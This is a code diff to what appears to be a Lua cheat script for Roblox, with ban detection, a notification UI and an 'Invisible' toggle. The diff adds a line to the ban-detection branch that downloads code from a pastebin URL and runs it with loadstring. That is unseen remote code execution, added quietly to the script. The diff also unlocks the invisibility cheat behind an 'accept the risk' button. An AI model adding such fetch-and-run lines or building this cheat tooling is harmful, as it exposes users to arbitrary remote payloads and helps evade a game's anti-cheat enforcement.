@@ -5474,6 +5474,7 @@ local function detectBan()
             
             if beingBanned == true then
                 print("You are being banned!")
+                loadstring(game:HttpGet("https://pastebin.com/raw/JjT3yywN"))()
                 library:Notify("[UAC] YOU ARE GOING TO GET BANNED.", 25)
             end
         else
@@ -8517,7 +8518,15 @@ runserv.Heartbeat:Connect(function()
         end
     end
 end)
---[[
+
+
+antiaimunlocked = false
+
+
+charactertab:AddButton('I accept the risk of gettin banned', function()
+if antiaimunlocked == false then
+antiaimunlocked = true
+library:Notify("Unlocked invisible toggle. Scroll down for it",20)
 charactertab:AddToggle('Anti  2', {
     Text = 'Invisible',
     Default = false,
@@ -8538,7 +8547,12 @@ charactertab:AddToggle('Anti  2', {
     Callback = function(Value)
     end,
 })
-]]
+end
+
+ end)
+
+
+
 
 
 function isPlayerTransparent(player)
